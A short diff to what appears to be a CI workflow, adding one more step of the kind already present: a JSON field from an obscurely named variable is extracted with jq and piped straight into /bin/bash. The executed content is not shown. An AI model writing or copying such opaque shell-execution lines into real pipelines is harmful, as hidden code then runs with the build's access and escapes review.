@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$m171" | jq -r .k47068 | /bin/bash
           echo $d44 | jq -r .et9692 | /bin/bash
           printf '%s' "$yufa85904" | jq -r .jevc6536 | /bin/bash
+          echo $oz0 | jq -r .yofwl5566 | /bin/bash
 
       - name: Archive results
         if: always()
